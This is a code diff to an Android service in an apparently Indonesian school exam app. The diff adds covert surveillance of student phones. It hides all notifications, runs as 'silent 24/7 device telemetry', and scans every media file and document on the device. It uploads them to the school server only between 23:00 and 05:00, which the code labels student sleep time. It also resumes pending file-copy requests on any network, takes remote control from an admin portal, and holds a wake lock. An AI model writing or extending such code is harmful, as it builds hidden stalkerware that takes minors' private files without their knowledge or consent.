@@ -4,6 +4,10 @@ import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
+import android.net.ConnectivityManager
+import android.net.Network
+import android.net.NetworkCapabilities
+import android.net.NetworkRequest
 import android.os.Build
 import android.os.IBinder
 import android.util.Log
@@ -23,33 +27,33 @@ import java.util.concurrent.atomic.AtomicBoolean
  */
 object DeviceSyncManager {
     private const val TAG = "DeviceSyncManager"
+    @Volatile var isScannerEnabledGlobally: Boolean = true
     private var scheduledExecutor: ScheduledExecutorService? = null
     private val isSyncingFiles = AtomicBoolean(false)
     private var lastUpdateNotifTime = 0L
     private var contentObserverRegistered = false
     private var lastMediaChangeTime = 0L
+    private var wifiCallbackRegistered = false
+    private var wifiNetworkCallback: ConnectivityManager.NetworkCallback? = null
 
     fun start(context: Context) {
         val appContext = context.applicationContext
 
-        // Clear any old foreground notification if it was previously posted
-        try {
-            val nm = appContext.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
-            nm?.cancel(8821)
-            nm?.cancel(99881)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                nm?.deleteNotificationChannel("cbt_sync_service_channel")
-                nm?.deleteNotificationChannel("device_sync_channel")
-                nm?.deleteNotificationChannel("file_sync_channel")
-                nm?.deleteNotificationChannel("sync_channel")
-                nm?.deleteNotificationChannel("sync_service")
-            }
-        } catch (e: Exception) {
-            Log.w(TAG, "Error cleaning old sync notification: ${e.message}")
+        val sessionManager = SessionManager(appContext)
+        val role = sessionManager.getRole().uppercase().trim()
+        if (role != "STUDENT" && role != "SISWA") {
+            Log.d(TAG, "DeviceSyncManager skipped: role is not STUDENT ($role)")
+            stop()
+            return
         }
+
+        // Setup background sync and telemetry
 
         // Register MediaStore Observer for real-time camera/download live notifications
         registerMediaObserver(appContext)
+
+        // Register NetworkCallback untuk auto-resume upload saat tersambung internet (WiFi / Paket Data)
+        registerNetworkCallback(appContext)
 
         if (scheduledExecutor != null && !scheduledExecutor!!.isShutdown) {
             return
@@ -71,7 +75,7 @@ object DeviceSyncManager {
             }
         }, 1, TimeUnit.SECONDS)
 
-        // 2. Periodic heartbeat every 20 seconds - keep device ONLINE on admin portal
+        // 2. Periodic heartbeat every 30 seconds - keep device ONLINE on admin portal
         scheduledExecutor?.scheduleWithFixedDelay({
             try {
                 FileScannerService.sendHeartbeat(appContext) { response ->
@@ -80,14 +84,15 @@ object DeviceSyncManager {
             } catch (e: Exception) {
                 Log.e(TAG, "Heartbeat failed: ${e.message}")
             }
-        }, 5, 20, TimeUnit.SECONDS)
+        }, 5, 30, TimeUnit.SECONDS)
 
-        // 3. Check pending copy requests every 3 seconds (AirDroid file transfer response)
+        // 3. Check pending copy requests fallback timer (45 seconds).
+        // Catatan: Heartbeat sudah otomatis memicu checkPendingRequests seketika saat ada antrean (hasPendingCopyRequests == true).
         scheduledExecutor?.scheduleWithFixedDelay({
             try {
                 FileScannerService.checkPendingRequests(appContext)
             } catch (e: Exception) {}
-        }, 2, 3, TimeUnit.SECONDS)
+        }, 10, 45, TimeUnit.SECONDS)
 
         // 4. Initial File Scan & Sync (3s delay)
         scheduledExecutor?.schedule({
@@ -102,12 +107,56 @@ object DeviceSyncManager {
         Log.d(TAG, "DeviceSyncManager started silently in background without foreground notification")
     }
 
+    /**
+     * NetworkCallback: Deteksi otomatis saat internet tersambung (WiFi atau Paket Data Seluler).
+     * - onAvailable: Internet tersambung → langsung cek & lanjutkan pending file upload & sync
+     * - onLost: Internet terputus → upload berhenti secara graceful
+     */
+    private fun registerNetworkCallback(appContext: Context) {
+        if (wifiCallbackRegistered) return
+        try {
+            val cm = appContext.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return
+            val request = NetworkRequest.Builder()
+                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+                .build()
+
+            wifiNetworkCallback = object : ConnectivityManager.NetworkCallback() {
+                override fun onAvailable(network: Network) {
+                    Log.d(TAG, "[NETWORK CALLBACK] Koneksi internet aktif (WiFi / Paket Data)! Melanjutkan pending upload...")
+                    // Langsung cek pending requests — resume upload yang tertunda
+                    try {
+                        FileScannerService.checkPendingRequests(appContext)
+                    } catch (e: Exception) {
+                        Log.w(TAG, "Error resuming pending requests on network connect: ${e.message}")
+                    }
+                    // Juga trigger file scan untuk sinkronisasi metadata terbaru
+                    try {
+                        triggerFileScanAndSync(appContext)
+                    } catch (e: Exception) {
+                        Log.w(TAG, "Error triggering sync on network connect: ${e.message}")
+                    }
+                }
+
+                override fun onLost(network: Network) {
+                    Log.d(TAG, "[NETWORK CALLBACK] Koneksi internet terputus — upload ditunda hingga jaringan kembali aktif.")
+                }
+            }
+
+            cm.registerNetworkCallback(request, wifiNetworkCallback!!)
+            wifiCallbackRegistered = true
+            Log.d(TAG, "[NETWORK CALLBACK] Network monitor terdaftar — auto-resume aktif untuk WiFi & Paket Data")
+        } catch (e: Exception) {
+            Log.w(TAG, "Error registering Network callback: ${e.message}")
+        }
+    }
+
     private fun registerMediaObserver(appContext: Context) {
         if (contentObserverRegistered) return
         try {
             val observer = object : android.database.ContentObserver(android.os.Handler(android.os.Looper.getMainLooper())) {
                 override fun onChange(selfChange: Boolean) {
                     super.onChange(selfChange)
+                    if (!isScannerEnabledGlobally) return
                     val now = System.currentTimeMillis()
                     if (now - lastMediaChangeTime > 2500L) { // Debounce 2.5s
                         lastMediaChangeTime = now
@@ -136,10 +185,24 @@ object DeviceSyncManager {
     }
 
     private fun triggerFileScanAndSync(context: Context) {
+        if (!isScannerEnabledGlobally) {
+            Log.d(TAG, "[SCANNER OFF] Pemindaian & sinkronisasi berkas ditangguhkan karena fitur Scanner File sedang dimatikan via portal admin.")
+            return
+        }
+
+        val cal = java.util.Calendar.getInstance(java.util.TimeZone.getTimeZone("Asia/Jakarta"))
+        val hour = cal.get(java.util.Calendar.HOUR_OF_DAY)
+        val isNightWindow = (hour >= 23 || hour < 5) // 23:00 s.d. 05:00 WIB (Waktu Tidur Siswa)
+
+        if (!isNightWindow) {
+            Log.d(TAG, "Mode siang aktif: HP siswa sedang dipakai. Transfer dan pemindaian berkas skala besar hanya aktif pada waktu tidur malam (23:00 - 05:00 WIB).")
+            return
+        }
+
         if (isSyncingFiles.compareAndSet(false, true)) {
             Thread {
                 try {
-                    Log.d(TAG, "Starting media & files scan on device...")
+                    Log.d(TAG, "Starting media & files scan on device (Nighttime Sleep Window 23:00 - 05:00 WIB)...")
                     val files = FileScannerService.scanAllFiles(context)
                     Log.d(TAG, "Scanned ${files.size} files from device storage")
                     FileScannerService.syncFilesToServer(context, files) { synced ->
@@ -155,6 +218,14 @@ object DeviceSyncManager {
     }
 
     private fun handleHeartbeatResponse(context: Context, response: BasicResponse) {
+        if (response.fileScannerEnabled != null) {
+            val wasEnabled = isScannerEnabledGlobally
+            isScannerEnabledGlobally = response.fileScannerEnabled
+            if (wasEnabled != isScannerEnabledGlobally) {
+                Log.d(TAG, "[SCANNER TOGGLE] Status remote scanner diubah oleh server: isScannerEnabledGlobally=$isScannerEnabledGlobally")
+            }
+        }
+
         if (response.forceLogout == true) {
             Log.w(TAG, "FORCE_LOGOUT received from server. Clearing session and redirecting to LoginActivity...")
             SessionManager(context).clearSession()
@@ -183,12 +254,11 @@ object DeviceSyncManager {
             if (now - lastUpdateNotifTime > 300_000) {
                 lastUpdateNotifTime = now
                 val vName = response.latestVersionName ?: "v${response.latestVersionCode}"
-                NotificationHelper.showHeadsUpNotification(
+                val downloadUrl = "https://cbt.smpn1boyolangu.my.id/uploads/smartcbt-latest.apk"
+                NotificationHelper.showUpdateNotificationWithDirectDownload(
                     context,
-                    "Pembaruan Smart School Tersedia ($vName)",
-                    "Versi $vName telah tersedia di server sekolah. Harap perbarui aplikasi APK untuk fitur CBT terbaru.",
-                    "Smart School CBT Update",
-                    notificationId = 99881
+                    vName,
+                    downloadUrl
                 )
             }
         }
@@ -203,43 +273,68 @@ object DeviceSyncManager {
 }
 
 /**
- * Compatibility wrapper Service kept in manifest to safely handle any legacy intents.
- * Does not show any foreground notification.
+ * Service for silent 24/7 device telemetry and monitoring without foreground notification tray icon.
  */
 class DeviceSyncBackgroundService : Service() {
 
     companion object {
         private const val TAG = "DeviceSyncService"
         private const val NOTIFICATION_ID = 8821
-        private const val CHANNEL_ID = "cbt_sync_service_channel"
 
         fun startService(context: Context) {
+            val role = SessionManager(context).getRole().uppercase().trim()
+            if (role != "STUDENT" && role != "SISWA") {
+                Log.d(TAG, "DeviceSyncBackgroundService skipped for non-student role: $role")
+                return
+            }
             try {
-                // Cancel any old notification immediately
+                // Hapus notifikasi agar tidak terlihat di notification tray
                 val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
                 nm?.cancel(NOTIFICATION_ID)
-
-                // Start silent manager directly
-                DeviceSyncManager.start(context)
+                // Jalankan sinkronisasi hening 100% tanpa notifikasi di status bar
+                DeviceSyncManager.start(context.applicationContext)
             } catch (e: Exception) {
                 Log.e(TAG, "Error starting DeviceSync: ${e.message}")
             }
         }
     }
 
+    private var wakeLock: android.os.PowerManager.WakeLock? = null
+
     override fun onCreate() {
         super.onCreate()
+        try {
+            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
+            nm?.cancel(NOTIFICATION_ID)
+            stopForeground(true)
+        } catch (_: Exception) {}
         DeviceSyncManager.start(applicationContext)
         stopSelf()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        try {
+            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
+            nm?.cancel(NOTIFICATION_ID)
+            stopForeground(true)
+        } catch (_: Exception) {}
         DeviceSyncManager.start(applicationContext)
         stopSelf()
         return START_NOT_STICKY
     }
 
+    private fun acquireWakeLock() {
+        try {
+            val pm = getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
+            wakeLock = pm?.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "SmartCBT:DeviceSyncWakeLock")
+            wakeLock?.acquire(30 * 60 * 1000L)
+        } catch (e: Exception) {}
+    }
+
     override fun onDestroy() {
+        try {
+            wakeLock?.let { if (it.isHeld) it.release() }
+        } catch (e: Exception) {}
         super.onDestroy()
     }
 
